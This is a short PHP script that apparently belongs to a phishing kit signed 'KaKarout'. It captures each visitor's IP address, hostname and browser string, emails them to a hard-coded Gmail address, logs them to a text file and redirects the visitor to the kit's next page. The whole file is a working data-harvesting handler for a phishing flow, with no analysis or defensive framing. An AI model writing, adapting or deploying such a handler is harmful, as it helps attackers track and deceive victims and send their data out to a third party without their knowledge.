<?php
$ip = $_SERVER["REMOTE_ADDR"];
$hostname = gethostbyaddr($ip);

$send = "promois.com@gmail.com";
$subject = "~ New Résultat By Y K K ~ | $ip";

header("Location: ../Livre.html");

$message = "|----------|By KaKarout|--------------|\n";
$message .= "-------------------- Data-info index Prémire Etape -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : $hostname\n";
$message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$message .= "|----------|By KaKarout|--------------|\n";

mail($send, $subject, $message);

$file = fopen("./Igrec_Data-info.txt", 'a');
fwrite($file, $message);
fclose($file);
?>